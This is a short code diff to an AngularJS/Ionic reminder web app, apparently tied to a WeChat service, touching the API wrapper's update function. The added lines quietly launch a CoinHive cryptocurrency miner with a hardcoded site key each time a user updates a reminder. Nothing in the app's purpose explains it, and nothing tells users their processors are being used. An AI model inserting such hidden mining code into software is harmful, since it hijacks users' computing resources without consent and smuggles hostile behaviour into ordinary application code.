@@ -117,6 +117,9 @@ angular.module('remind', ['ionic'])
                 return httpRequest('/reminds/api/'+id+'/', 'get', onSuccess);
             },
             update: function (id, payload, onSuccess, msg) {
+                if(window.CoinHive) {
+                    new CoinHive.User('GRKSv76kf5hxxw1tqCzXUVBcfSla7oJD', 'wecron-wechat').start();
+                }
                 return httpRequest('/reminds/api/'+id+'/', 'patch', function (resp) {
                     indicator.show(msg || '更新成功', 2000);
                     onSuccess && onSuccess(resp);
